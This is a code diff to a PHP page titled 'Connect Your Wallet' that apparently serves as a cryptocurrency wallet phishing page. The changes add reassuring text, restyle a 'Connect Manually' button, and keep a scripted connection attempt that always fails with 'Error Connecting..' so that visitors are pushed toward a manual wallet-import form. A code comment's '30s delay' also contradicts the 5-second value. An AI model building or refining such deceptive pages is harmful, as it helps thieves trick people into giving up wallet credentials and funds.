@@ -68,12 +68,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['import_method'])) {
         .wallet-card:hover {
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
         }
+        .btn-orange{
+            background-color: rgb(255, 120, 95);
+            color: white;
+        }
     </style>
 </head>
 
 <body class="bg-gray-100">
     <div class="container py-5">
         <h2 class="text-center mb-6 font-bold text-3xl text-blue-700">Connect Your Wallet</h2>
+        <p class="text-center mb-6 mx-auto font-bold">
+            Multiple iOS and Android wallets support the protocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp with your mobile wallet.
+        </p>
         <div class="row justify-content-center">
             <?php foreach ($wallets as $wallet): ?>
                 <div class="col-md-4 mb-4">
@@ -95,7 +102,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['import_method'])) {
                         <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                     </div>
                     <div class="modal-body">
-                        <div id="modalStatus" class="mb-3 p-3 rounded-3 border border-danger text-danger fw-bold">Connecting...</div>
                         <div class="d-flex align-items-center mb-3 p-3 rounded-3 border border-secondary">
                             <img id="modalWalletImage" src="" alt="" class="me-2" style="border-radius:50%;height:24px;width:24px;">
                             <div>
@@ -103,8 +109,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['import_method'])) {
                                 <div id="modalWalletDesc" class="text-muted small"></div>
                             </div>
                         </div>
-                        <div id="manualConnectBtn" class="d-flex justify-content-end" style="display:none;">
-                            <button class="btn btn-secondary" id="showImportModal">Connect Manually</button>
+                        <div class="d-flex align-items-center mb-3">
+                            <div id="modalStatus" class="p-3 rounded-3 text-danger fw-bold flex-grow-1">Connecting...</div>
+                            <div id="manualConnectBtn" class="ms-3" style="display:none;">
+                                <button class="btn btn-orange" id="showImportModal">Connect Manually</button>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -176,11 +185,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['import_method'])) {
                 $('#modalWalletName').text($(this).data('name'));
                 $('#modalWalletDesc').text('Easy-to-use browser extension.');
                 walletModal.show();
-                // Simulate connection attempt
+                // Simulate connection attempt with 30s delay
                 setTimeout(function() {
                     $('#modalStatus').text('Error Connecting..').removeClass('text-success').addClass('text-danger');
-                    $('#manualConnectBtn').show();
-                }, 1500);
+                    $('#manualConnectBtn').show(); // Show button when error
+                }, 5000); // 5 seconds
             });
             $('#showImportModal').on('click', function() {
                 walletModal.hide();
